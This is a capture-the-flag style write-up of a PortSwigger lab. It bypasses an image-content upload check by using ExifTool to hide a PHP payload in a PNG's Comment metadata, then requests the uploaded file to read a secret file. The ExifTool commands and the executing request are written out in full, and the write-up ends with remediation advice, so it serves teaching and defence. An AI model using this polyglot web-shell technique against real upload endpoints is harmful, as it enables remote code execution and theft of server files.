# Remote Code Execution via Polyglot Web Shell Upload

**Platform:** PortSwigger Web Security Academy
**Category:** File Upload
**Difficulty:** Practitioner
**Status:** ✅ Solved

## Background

This lab's upload goes one step further than an extension check: it inspects the file's *contents* to verify that the upload really is an image. That defeats a renamed script, but it creates a new question — what if a file is genuinely a valid image *and* a valid script at the same time? That is a **polyglot file**. Image formats carry metadata fields (such as a JPEG or PNG Comment) that image parsers read or ignore without affecting the picture, while a PHP interpreter scanning the same bytes will happily execute a `<?php ... ?>` block wherever it finds one. So a real photograph with a PHP payload hidden in its metadata passes a content check honestly — it *is* an image — and then executes as code when the server stores it under a `.php` name and serves it through the PHP engine.

## Lab Objective

The site's image upload function checks the contents of the file to verify it is a genuine image, but it is still possible to upload and execute server-side code. Upload a basic PHP web shell, use it to read `/home/carlos/secret`, and submit the secret via the lab banner.

**Provided resources:** your account `wiener:peter`.

<img width="2181" height="1124" alt="step-1" src="https://github.com/user-attachments/assets/28df9839-a97d-44c1-b664-9c920798c13b" />


<img width="2952" height="1616" alt="step-2" src="https://github.com/user-attachments/assets/46e8ad32-e186-46e7-9a9e-8ce5c917f0b5" />


## Walkthrough

### Step 1: Find the Upload and Try a Plain PHP Shell

Log in as `wiener` and open your account page. It offers an avatar upload — the vulnerable function.

<img width="2454" height="1398" alt="step-3" src="https://github.com/user-attachments/assets/8cc21d7b-afb5-4690-87af-728b47433669" />


Try the direct approach first: select a plain PHP shell (`pann.php`) containing the usual one-liner and upload it.

<img width="2118" height="1363" alt="step-4" src="https://github.com/user-attachments/assets/c7cba8c4-7154-4942-8121-7dc5b97794e7" />


It is rejected, and the error is different from a simple extension block:

> Error: file is not a valid image

That message is the key observation. The server is not just reading the filename — it is parsing the file's contents and checking that they form a real image. A script with an image extension would fail the same way. The bypass therefore has to be a file that passes as an image on its merits.

<img width="1547" height="408" alt="step-5" src="https://github.com/user-attachments/assets/83bb9ac0-4a3b-488f-a5b1-272864656eb0" />


### Step 2: Build a Polyglot — a Real Image Carrying a PHP Payload

Use ExifTool to write the PHP payload into a genuine image's Comment metadata, and save the output with a `.php` extension. The payload is wrapped in `START` / `END` markers so the secret can be spotted later inside the image's binary data:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

The first attempt built the polyglot from a JPG (`me.jpg`), and ExifTool created it without any problem:

<img width="2833" height="618" alt="step-6" src="https://github.com/user-attachments/assets/4549a411-55e6-43c4-877e-a0bcc7d09004" />


In this run, however, the JPG route did not work — the JPG upload itself was not accepted. A PNG upload, by contrast, went through successfully, so the same build was repeated with a PNG as the source image.

<img width="2329" height="1405" alt="step-7" src="https://github.com/user-attachments/assets/2b0b98fa-9ebe-4a2e-bb4d-cef8ac5fe6a6" />


```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" me.png -o polyglot.php
```

ExifTool again reports `1 image files created`. The result, `polyglot.php`, is still a perfectly valid PNG image — only its Comment field has changed.
<img width="2818" height="563" alt="step-8" src="https://github.com/user-attachments/assets/2f899968-4b43-4d55-bd4f-35eaca6e6041" />

### Step 3: Upload the Polyglot

Upload `polyglot.php` as your avatar. This time the content check passes, because the file genuinely is an image, and the server confirms the upload under its script name:

> The file avatars/polyglot.php has been uploaded.

<img width="2157" height="460" alt="step-9" src="https://github.com/user-attachments/assets/e8b224ce-6887-4960-a6b2-f1e1ba021ab8" />


### Step 4: Execute It and Read the Secret Between the Markers

Request the uploaded file:

```http
GET /files/avatars/polyglot.php
```

The server hands the file to the PHP engine because of its `.php` extension. PHP ignores the image data and executes the code it finds in the Comment field. In Burp, the response is mostly the image's binary content — but inside it, the executed payload has printed its markers with the prize between them: `START <secret> END`, in the image's text/Comment chunk. Those markers are what make the secret findable in a wall of binary data.

<img width="3007" height="700" alt="step-10" src="https://github.com/user-attachments/assets/cf70b1f5-15bd-4f91-856f-d70c37bf9005" />


### Step 5: Submit the Secret

Copy the secret from between the `START` and `END` markers and submit it using the button in the lab banner. The lab is solved.
<img width="3503" height="890" alt="step-11" src="https://github.com/user-attachments/assets/7fdf0d0b-9be4-468f-b795-0ec242a13a2a" />


<img width="3118" height="744" alt="step-12" src="https://github.com/user-attachments/assets/0c82e6f5-8662-43dd-881b-7ead92d40a08" />


## Key Takeaways

- A content check proves a file *is* an image; it does not prove the file is *only* an image. Polyglots live in that gap, in metadata and other regions that one parser ignores and another executes.
- The extension still decided execution. The polyglot only became code because it was stored and served as `.php` — content validation cannot compensate for letting users choose an executable name.
- Small practical detours are normal: the JPG-based polyglot was built correctly but not accepted in this run, and switching the source image to PNG — same technique, same payload — is what completed the lab.

## Remediation

Do not rely on content checks alone. Re-encode every uploaded image server-side (load it with an image library and write out a fresh file), which strips metadata and any embedded payload; generate random server-side filenames with an allowlisted image extension; and store and serve uploads from a location where script execution is disabled, ideally outside the web root or from a separate static domain. A file the user supplied should never be reachable under an executable extension, whatever its contents claim to be.
